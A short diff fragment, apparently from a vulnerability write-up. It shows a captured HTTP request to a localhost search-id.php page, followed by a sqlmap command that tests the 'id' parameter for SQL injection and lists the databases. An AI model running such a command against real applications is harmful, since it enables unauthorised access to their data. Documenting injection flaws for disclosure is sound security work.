@@ -25,6 +25,7 @@ Referer: http://localhost/search-id.php
 Accept-Encoding: gzip, deflate, br
 Cookie: PHPSESSID=pvm9s24kls26lgqj0730spgclj
 Connection: keep-alive
+---
 Using sqlmap tool:
 
 python sqlmap.py -r 1 -p id --batch --dbs
